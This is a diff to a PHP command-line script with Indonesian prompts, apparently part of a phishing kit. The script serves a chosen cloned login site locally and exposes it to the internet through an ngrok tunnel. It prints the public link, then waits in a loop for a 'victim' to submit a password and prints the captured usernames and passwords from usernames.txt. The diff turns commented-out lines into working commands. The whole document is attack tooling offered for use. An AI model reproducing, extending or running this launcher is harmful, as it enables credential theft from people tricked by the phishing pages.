@@ -30,13 +30,39 @@ while($no <=33)
 
 echo "Masukan Nomor : ";
 $sites = trim(fgets(STDIN));
-//echo $directory[$sites]."\n";
-echo "\n\nRunning Server 20 Detik";
-//sleep(20);
+echo "\n\nRunning Server 20 Detik\n\n";
 $directory = $directory[$sites];
-//exec("cd sites/$directory/ && php -S localhost:1337");
-//exec("chmod 755 Ngrok.sh");
-//exec("./ngrok http 1337");
-//echo exec("curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url");
-shell_exec("cd sites/$directory/ && php -S localhost:1337");
+exec("./ngrok http 1337 > /dev/null 2>&1 &");
+sleep(20);
+echo "Link Server : \n";
+echo exec("curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url")."\n";
+shell_exec("cd sites/$directory/ && php -S localhost:1337 > /dev/null 2>&1 &");
+
+if(file_exists("sites/$directory/usernames.txt"))
+{
+shell_exec("cd sites/$directory/ && rm -rf usernames.txt");
+fopen("sites/$directory/usernames.txt", "w");
+}else{
+fopen("sites/$directory/usernames.txt", "w");
+}
+
+sleep(5);
+
+
+echo "\n\nMenunggu Korban .... \n\n";
+
+while(true)
+{
+$count = 0;
+$myFile = "sites/$directory/usernames.txt";
+$fh = fopen($myFile, 'r');
+while(!feof($fh)){
+    $fr = fread($fh, 8192);
+    $count += substr_count($fr, 'Pass:');
+}
+fclose($fh);
+if($count > 0)
+{echo "Korban Terperangkap : \n"; echo exec("cat sites/$directory/usernames.txt"); echo "\n\n";break;}
+}
+
 ?>
